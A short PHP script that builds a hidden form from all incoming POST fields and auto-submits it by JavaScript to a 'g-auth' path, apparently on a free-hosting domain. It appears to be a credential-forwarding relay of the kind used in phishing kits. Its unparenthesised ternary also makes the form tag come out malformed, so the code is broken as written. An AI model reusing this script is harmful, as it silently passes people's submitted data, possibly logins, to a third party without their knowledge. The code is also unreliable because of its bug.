<?php
define('devel', true); 
if (devel) {
  echo '<form id="myForm" action="'.($_SERVER['HTTP_HOST'] == 'wkb.dev')?'https://wkb.dev/github/smslaunch.epizy.com/connect.smslaunch.ml/htdocs':''.'/g-auth/context/fun-night.php" method="post">';
    foreach ($_POST as $a => $b) {
        echo '<input type="hidden" name="'.htmlentities($a).'" value="'.htmlentities($b).'">';
    }
    echo <<<EOT
    <noscript><input type="submit" value="Continue"></noscript>
</form>
<script type="text/javascript">
    document.getElementById('myForm').submit();
</script>
EOT;
} ?>